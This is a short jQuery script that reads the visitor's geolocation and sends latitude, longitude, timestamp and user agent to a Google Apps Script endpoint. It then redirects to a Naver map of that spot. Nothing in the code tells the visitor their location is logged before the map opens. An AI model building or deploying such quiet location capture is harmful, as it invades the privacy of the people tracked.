$(document).ready(function() {
	if (!navigator.geolocation) {
		alert("지원하지 않는 브라우저 입니다.");
		return;
	}
	navigator.geolocation.getCurrentPosition (function(pos) {
		var latitude = pos.coords.latitude; // 위도
		var longitude = pos.coords.longitude; // 경도
		addLocation(latitude, longitude);
	});
});

function addLocation(latitude, longitude) {
	$.ajax({
		type: "GET",
		url : "https://script.google.com/macros/s/AKfycby-BZnxtvT_RBEYI9iVyMfBTtJgYPzSzH10AqDldDMT4HWrd38-LZENxQRVsHUd6CiA/exec",
		data: {
			"timestamp" : getDateTime(),
			"latitude" : latitude,
			"longitude" : longitude,
			"agent" : navigator.userAgent.toLowerCase()
		},
		success : function() {
			openMap(latitude, longitude);
		}
	});
}

function getDateTime() {
	var date = new Date();
	return date.getFullYear() + ". " + (date.getMonth() + 1) + ". " + date.getDate() + "  " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds();
}

function openMap(latitude, longitude) {
	if (latitude == null || longitude == null)
		return;
	location.href = "https://m.map.naver.com?lat=" + latitude + "&lng=" + longitude;
}
